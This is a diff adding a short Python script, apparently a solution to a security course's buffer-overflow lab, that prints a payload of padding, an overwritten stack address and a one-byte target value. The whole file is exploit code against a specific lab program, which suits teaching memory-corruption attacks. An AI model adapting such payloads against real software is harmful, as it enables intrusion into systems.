@@ -1,0 +1,14 @@
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE HERE ###
+addr = '\xbc\xff\xdf\xdf' # Original address = 0xffffdf98
+target = '\x80' # 0xa0 XOR 0x20
+garbage = 'A' * 56
+
+payload = 'aaaa' + addr + garbage + target
+print(payload)
